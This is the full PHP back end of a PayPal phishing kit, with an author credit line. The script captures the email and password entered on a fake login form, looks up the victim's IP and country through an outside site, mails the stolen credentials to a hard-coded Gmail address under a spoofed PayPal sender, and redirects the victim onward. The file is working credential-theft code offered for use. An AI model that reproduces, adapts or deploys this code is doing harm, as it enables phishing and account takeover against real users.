<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$url="http://www.trouver-ip.com/index.php?ip=".$ip;
$s=file_get_contents($url);
$n=explode('flags/', $s);
$s=explode('.png', $n[1]);
$pays=$s[0];
$bilsmg .= "Codec By DeVr0$ & X-Ray\n";
$bilsmg .= "#################################\n";
$bilsmg .= "Email    : ".$_POST['login_email']."\n";
$bilsmg .= "Password : ".$_POST['login_password']."\n";
$bilsmg .= "#################################\n";
$bilsnd = "spammeryassine6@gmail.com";
$bilsub = "|~ LOGIN Fr0m : $pays ~| [$ip] =?UTF-8?Q?=E2=9C=89_?=";
$bilhead = "From: PayPal =?UTF-8?Q?=E2=9C=89_?= <localhost>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

header("Location: log.php");
?>